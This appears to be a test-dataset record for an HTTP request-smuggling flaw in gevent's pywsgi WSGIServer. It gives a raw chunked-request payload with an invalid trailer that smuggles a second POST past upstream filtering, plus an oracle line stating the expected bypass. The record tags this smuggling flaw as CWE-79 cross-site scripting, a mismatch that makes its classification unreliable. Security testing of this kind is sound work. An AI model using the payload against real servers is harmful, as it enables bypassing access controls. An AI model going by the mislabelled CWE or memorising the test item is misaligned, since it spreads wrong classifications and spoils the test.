title: Improper handling of invalid trailers in chunked requests on keep-alive connections in gevent.pywsgi.WSGIServer
cwe: CWE-79: Improper Neutralization of Input During Web Page Generation (Cross Site Scripting)
trigger_payload:
POST /path1 HTTP/1.1
Host: a.com
Transfer-Encoding: chunked
Connection: keep-alive
2
a2
0
Header: value
POST /path2?a=:123 HTTP/1.1
Host: a.com
Connection: close
oracle: The second request bypasses upstream server checks due to improperly handled trailers, allowing unauthorized access to paths or headers that should have been filtered.
